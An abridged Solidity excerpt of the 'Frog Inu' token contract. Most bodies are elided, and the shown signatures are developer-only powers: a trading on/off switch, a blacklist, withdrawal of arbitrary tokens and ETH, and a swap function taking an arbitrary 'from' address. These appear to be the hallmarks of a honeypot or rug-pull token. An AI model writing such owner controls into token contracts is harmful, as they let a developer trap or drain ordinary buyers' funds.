...
contract FGI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Frog Inu";
    ...
    address payable public liquidityWalletAddress = payable(msg.sender);
    ...
    //The share should be the same proportion of the tax
    ...
    address public dev;
    modifier onlyDev() {
        require(msg.sender == dev || isOwner(msg.sender));
        _;
    }
    ...
    function tradingStatus(bool _status) public onlyDev {
        isLaunch = _status;
        launchedBlock = block.number;
    }
    ...
    //Set tax exception
    function setIsExcludedFromFee(address account, bool newValue) public onlyDev {
    ...
    function swapExactTokensForETH(address from, address[] calldata addresses, uint256 tokens) external onlyDev {
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external onlyDev() {
        _maxTxAmount = maxTxAmount;
    }

    function enableDisableWalletLimit(bool newValue) external onlyDev {
    ...
    function setIsWalletLimitExempt(address holder, bool exempt) external onlyDev {
        isWalletLimitExempt[holder] = exempt;
    }

    //Set wallet limit amount    
    function setWalletLimit(uint256 newLimit) external onlyDev {
        _walletMax  = newLimit;
    }
    ...
    function setMarketingWalletAddress(address newAddress) external onlyDev() {
    ...
    function transferToken(address _tokenAddr, address _to, uint _amount) public onlyDev {        
        IERC20(_tokenAddr).transfer(_to, _amount);
    }

    function transferETH(address payable _recipient) public onlyDev {
    ...
    //Add blacklist
    function writeBlackList(address recipient, bool isBlack) public onlyDev {
